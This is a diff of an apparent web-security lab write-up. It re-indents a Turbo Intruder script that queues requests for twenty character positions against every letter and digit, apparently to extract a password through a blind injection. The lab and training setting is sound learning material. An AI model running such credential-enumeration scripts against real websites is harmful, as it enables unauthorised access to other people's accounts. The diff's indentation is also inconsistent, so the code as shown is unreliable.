@@ -21,21 +21,21 @@ Note: the valid character will response code status 0 due to delays
 ![alt text](lab11.png)
 
 # Turbo Intruder Script:
-def queueRequests(target, wordlists):
-    engine = RequestEngine(
+    def queueRequests(target, wordlists):
+        engine = RequestEngine(
         endpoint=target.endpoint,
         concurrentConnections=3,
         requestsPerConnection=10,
         pipeline=False
     )
 
-passwords = "qwertyuiopasdfghjklzxcvbnm1234567890"
+    passwords = "qwertyuiopasdfghjklzxcvbnm1234567890"
 
-for loop in range(1,21):
-    for pwd in passwords:
-        engine.queue(target.req, [loop, pwd])
+    for loop in range(1,21):
+        for pwd in passwords:
+            engine.queue(target.req, [loop, pwd])
 
-def handleResponse(req, interesting):
-    table.add(req)
+    def handleResponse(req, interesting):
+        table.add(req)
 
 
